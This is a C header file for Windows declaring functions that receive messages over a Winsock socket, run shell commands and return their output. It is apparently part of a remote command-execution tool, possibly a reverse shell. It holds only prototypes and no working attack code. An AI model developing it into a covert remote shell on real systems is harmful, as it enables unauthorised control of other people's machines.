#ifndef SHELL_COMM_HEADER
#define SHELL_COMM_HEADER

#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

int comm(SOCKET sock, int BUF_SIZE, int REPLY_MAX_SIZE);

char* processMsg(char * msg, char * cwd, int REPLY_MAX_SIZE);

char* processShellCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE);

char* processExtCmd(char * cmd, char * cwd, int REPLY_MAX_SIZE);

char* getCmdOut(char * cmd, int REPLY_MAX_SIZE);

#endif